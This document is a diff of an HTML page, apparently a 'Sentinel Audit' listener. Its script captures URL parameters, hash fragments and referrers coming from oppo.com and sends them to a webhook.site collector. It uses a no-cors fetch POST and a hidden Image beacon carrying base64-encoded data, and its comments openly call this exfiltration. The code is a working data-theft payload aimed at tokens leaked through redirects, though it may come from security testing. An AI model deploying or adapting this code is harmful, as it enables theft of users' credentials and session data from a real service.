@@ -1,54 +1,36 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Forge Vertical - Audit Handshake</title>
-    <style>
-        body { font-family: 'Courier New', Courier, monospace; background: #0a0a0a; color: #00ff41; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #00ff41; padding: 2rem; border-radius: 8px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.4); text-align: center; }
-        h1 { font-size: 1.5rem; text-transform: uppercase; letter-spacing: 2px; }
-        #status { font-weight: bold; }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h1>Forge Vertical: Sentinel Audit</h1>
-        <p id="status">Listening for Handshake...</p>
-    </div>
+<script>
+    const webhookUrl = "https://webhook.site/7f9c8926-c9df-44ee-9350-db06430369aa";
+    const statusEl = document.getElementById('status');
 
-    <script>
-        const webhookUrl = "https://webhook.site/7f9c8926-c9df-44ee-9350-db06430369aa";
-        const statusEl = document.getElementById('status');
+    const urlData = window.location.search;
+    const fragmentData = window.location.hash;
+    const leakingReferrer = document.referrer;
 
-        // 1. Grab everything: URL Params, Hash Fragments, and the Referrer
-        const urlData = window.location.search;
-        const fragmentData = window.location.hash;
-        const leakingReferrer = document.referrer;
+    if (leakingReferrer.includes("oppo.com") || urlData || fragmentData) {
+        
+        statusEl.innerText = "CRITICAL: Handshake Intercepted. Data Exfiltrated.";
+        statusEl.style.color = "#ff3131";
 
-        // 2. The Logic: If we have a Referrer from OPPO or data in the URL, fire.
-        if (leakingReferrer.includes("oppo.com") || urlData || fragmentData) {
-            
-            statusEl.innerText = "CRITICAL: Handshake Intercepted. Data Exfiltrated.";
-            statusEl.style.color = "#ff3131";
+        // A. THE PRIMARY: POST fetch for the structured audit report
+        fetch(webhookUrl, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({
+                audit_event: "OPPO_V3_HANDSHAKE",
+                referrer_leak: leakingReferrer || "DIRECT_ACCESS",
+                url_params: urlData || "NONE",
+                timestamp: new Date().toISOString()
+            })
+        });
 
-            // 3. Fire the payload to your Webhook Node
-            fetch(webhookUrl, {
-                method: 'POST',
-                mode: 'no-cors', // Use no-cors to bypass potential Pre-flight blocks
-                body: JSON.stringify({
-                    audit_event: "OPPO_V3_HANDSHAKE",
-                    referrer_leak: leakingReferrer || "DIRECT_ACCESS",
-                    url_params: urlData || "NONE",
-                    hash_fragment: fragmentData || "NONE",
-                    user_agent: navigator.userAgent,
-                    timestamp: new Date().toISOString()
-                })
-            });
+        // B. THE GHOST (Reliability Booster): Force a GET request via Image
+        // This ensures capture even if the POST body is stripped by the browser.
+        const exfiltrator = new Image();
+        const encodedData = btoa(unescape(encodeURIComponent(leakingReferrer)));
+        exfiltrator.src = `${webhookUrl}?leak_b64=${encodedData}&type=ghost_img&ts=${Date.now()}`;
 
-            console.log("Sentinel: Handshake data sent to Webhook.");
-        } else {
-            statusEl.innerText = "Listener Active. Waiting for OPPO Handshake.";
-        }
-    </script>
-</body>
-</html>
+        console.log("Sentinel: Handshake exfiltrated via Fetch and Image Node.");
+    } else {
+        statusEl.innerText = "Listener Active. Waiting for OPPO Handshake.";
+    }
+</script>
